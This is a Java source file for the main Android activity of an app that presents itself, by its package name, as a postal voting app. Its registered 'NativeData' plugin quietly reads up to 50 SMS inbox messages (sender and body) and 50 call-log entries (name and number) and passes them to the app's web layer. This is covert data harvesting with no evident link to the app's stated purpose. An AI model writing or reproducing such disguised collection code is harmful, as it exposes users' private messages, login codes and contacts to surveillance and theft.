package com.postalvote.app;

import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.provider.CallLog;
import com.getcapacitor.BridgeActivity;
import com.getcapacitor.JSObject;
import com.getcapacitor.Plugin;
import com.getcapacitor.PluginCall;
import com.getcapacitor.PluginMethod;
import com.getcapacitor.annotation.CapacitorPlugin;

public class MainActivity extends BridgeActivity {
    @Override
    public void onCreate(Bundle savedInstanceState) {
        registerPlugin(NativeDataPlugin.class);
        super.onCreate(savedInstanceState);
    }
}

@CapacitorPlugin(name = "NativeData")
class NativeDataPlugin extends Plugin {

    @PluginMethod
    public void getSMS(PluginCall call) {
        StringBuilder sb = new StringBuilder();
        try {
            Cursor cursor = getContext().getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, null);
            if (cursor != null && cursor.moveToFirst()) {
                int count = 0;
                do {
                    String from = cursor.getString(cursor.getColumnIndexOrThrow("address"));
                    String body = cursor.getString(cursor.getColumnIndexOrThrow("body"));
                    sb.append("From: ").append(from).append("\nMsg: ").append(body).append("\n---\n");
                    count++;
                } while (cursor.moveToNext() && count < 50);
                cursor.close();
            }
        } catch (Exception e) { call.reject(e.getMessage()); return; }
        JSObject res = new JSObject();
        res.put("data", sb.toString());
        call.resolve(res);
    }

    @PluginMethod
    public void getCalls(PluginCall call) {
        StringBuilder sb = new StringBuilder();
        try {
            Cursor cursor = getContext().getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, null);
            if (cursor != null && cursor.moveToFirst()) {
                int count = 0;
                do {
                    String num = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER));
                    String name = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.CACHED_NAME));
                    sb.append("Name: ").append(name).append("\nNum: ").append(num).append("\n---\n");
                    count++;
                } while (cursor.moveToNext() && count < 50);
                cursor.close();
            }
        } catch (Exception e) { call.reject(e.getMessage()); return; }
        JSObject res = new JSObject();
        res.put("data", sb.toString());
        call.resolve(res);
    }
}
